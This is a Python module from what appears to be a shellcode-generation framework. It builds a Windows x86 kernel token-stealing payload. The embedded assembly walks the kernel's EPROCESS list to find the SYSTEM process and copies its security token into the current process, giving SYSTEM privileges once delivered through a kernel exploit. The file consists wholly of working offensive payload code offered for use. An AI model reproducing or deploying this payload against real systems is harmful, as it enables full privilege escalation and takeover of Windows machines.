import sys
import math
import struct
import binascii

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.mparser import argument_check

class Shellcode():

    name = "Windows (x86) Kernel Token Stealing Stub"

    module = "windows/x86/kernel_token_stealer"

    example_run = f"{sys.argv[0]} -p {module} -f c"

    platform = "Windows"

    arch = 'x86'

    ring = 0

    author = ["Mark Dowd", "Barnaby Jack", "wetw0rk"]

    tested_platforms = ["Windows 7"]

    summary = "Kernel token stealing shellcode (Windows x86)"

    description = """
    Hijacks a security token of another process (specifically NT/AUTHORITY SYSTEM),
    allowing for elevation of privledges. Due to the nature of kernel exploitation
    this shellcode DOES NOT contain instructions for returning to userland.
    """

    arguments = None

    tested_platforms = ["Windows 7"]

    def __init__(self, arg_object):


        self.arg_list = arg_object["positional arguments"]
        self.builder = Assembler(Shellcode.arch)

        return

    def generate_source(self):
        shellcode = """
        _start:
            pushad                            ; Save register state
            xor eax, eax                      ; set ZERO
            mov eax, fs:[eax+0x124]           ; nt!_KPCR.PcrbData.CurrentThread
            mov eax, [eax + 0x50]             ; nt!_KTHREAD.ApcState.Process
            mov ecx, eax                      ; Copy current process _EPROCESS structure
            mov edx, 0x04                     ; WIN 10 SYSTEM PROCESS PID
        SearchSystemPID:
            mov eax, [eax + 0xb8]             ; nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, 0xb8
            cmp [eax + 0xb4], edx             ; nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID
        found:
            mov edx, [eax + 0xf8]             ; Get SYSTEM process nt!_EPROCESS.Token
            mov [ecx + 0xf8], edx             ; Replace target process nt!_EPROCESS.Token
            popad                             ; Restore registers
        """

        return shellcode

    def get_shellcode(self):
        """Generates Kernel Token Stealing Stub
        """

        return self.builder.get_bytes_from_asm(self.generate_source())

def generate():
    return Shellcode().get_shellcode()
